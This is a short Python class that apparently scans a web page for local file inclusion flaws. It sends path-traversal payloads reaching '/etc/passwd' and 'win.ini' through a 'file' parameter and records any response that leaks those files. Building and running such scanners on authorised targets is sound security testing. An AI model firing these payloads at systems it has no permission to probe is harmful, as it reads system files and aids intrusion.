import requests
import time

class LFIScanner:
    def __init__(self):
        self.name = "LFI Scanner"
        self.description = "Scans for Local File Inclusion vulnerabilities"
        
    def scan(self, url, verbose=False, delay=0.5):
        results = []
        test_payloads = [
            "../../etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
            "..\\..\\windows\\win.ini"
        ]

        for payload in test_payloads:
            test_url = f"{url}?file={payload}"
            try:
                response = requests.get(test_url, timeout=10)
                if "root:x" in response.text or "[extensions]" in response.text:
                    results.append({
                        'vulnerable': True,
                        'payload': payload,
                        'url': test_url,
                        'evidence': response.text[:200]
                    })
                    if verbose:
                        print(f"[+] LFI detected with payload: {payload}")
                else:
                    if verbose:
                        print(f"[-] No LFI detected with: {payload}")
            except requests.RequestException as e:
                if verbose:
                    print(f"[!] Request error with payload {payload}: {e}")
            time.sleep(delay)
        
        return results
